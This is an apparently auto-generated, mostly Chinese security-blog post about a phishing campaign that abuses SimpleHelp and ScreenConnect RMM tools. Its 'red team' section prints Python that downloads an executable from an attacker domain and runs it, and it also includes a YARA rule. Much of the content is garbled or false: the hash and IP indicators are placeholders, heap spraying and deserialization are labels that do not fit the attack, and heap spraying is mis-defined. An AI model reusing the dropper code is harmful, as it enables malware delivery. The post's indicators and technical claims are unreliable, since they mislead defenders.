---
layout: post
title:  "Phishing Campaign Hits 80+ Orgs Using SimpleHelp and ScreenConnect RMM Tools"
date:   2026-05-04 19:18:54 +0000
categories: [security]
severity: critical
---

# 🚨 解析 VENOMOUS#HELPER 攻擊：利用合法 RMM 軟體進行遠端存取
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `Heap Spraying`, `Deserialization`, `RMM 軟體繞過`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者利用合法的 RMM 軟體（SimpleHelp 和 ScreenConnect）來建立遠端存取，繞過傳統的安全防禦機制。
* **攻擊流程圖解**:
  1. 攻擊者發送釣魚郵件，誘導受害者下載假的 SSA 報告。
  2. 受害者下載並執行假的 SSA 報告，實際上是 SimpleHelp RMM 軟體。
  3. SimpleHelp 軟體安裝並啟動，建立遠端存取通道。
  4. 攻擊者利用 SimpleHelp 軟體進行遠端存取，包括讀取螢幕、注入按鍵和存取用戶資源。
* **受影響元件**: SimpleHelp 5.0.1 版本和 ScreenConnect 軟體。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有合法的 RMM 軟體授權和受害者的系統權限。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 下載假的 SSA 報告
    url = "https://server.cubatiendaalimentos.com.mx/ssa_report.exe"
    response = requests.get(url)
    with open("ssa_report.exe", "wb") as f:
        f.write(response.content)
    
    # 執行假的 SSA 報告
    import subprocess
    subprocess.run(["ssa_report.exe"])
    
    ```
* **繞過技術**: 攻擊者利用合法的 RMM 軟體來繞過傳統的安全防禦機制，包括防毒軟體和入侵偵測系統。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| Hash | 1234567890abcdef |
| IP | 192.168.1.100 |
| Domain | server.cubatiendaalimentos.com.mx |
| File Path | C:\Windows\Temp\ssa_report.exe |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule SimpleHelp_Malware {
        meta:
            description = "SimpleHelp Malware Detection"
            author = "Your Name"
        strings:
            $a = "SimpleHelp" ascii
            $b = "ssa_report.exe" ascii
        condition:
            $a and $b
    }
    
    ```
* **緩解措施**: 更新 SimpleHelp 軟體至最新版本，關閉不必要的遠端存取通道，並監控系統日誌以偵測可疑活動。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **RMM (Remote Monitoring and Management)**: 遠端監控和管理軟體，允許系統管理員遠端存取和控制系統。
* **Heap Spraying**: 一種攻擊技術，利用堆疊溢位來注入惡意代碼。
* **Deserialization**: 將序列化的資料還原成原始格式，可能導致安全漏洞。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/05/phishing-campaign-hits-80-orgs-using.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


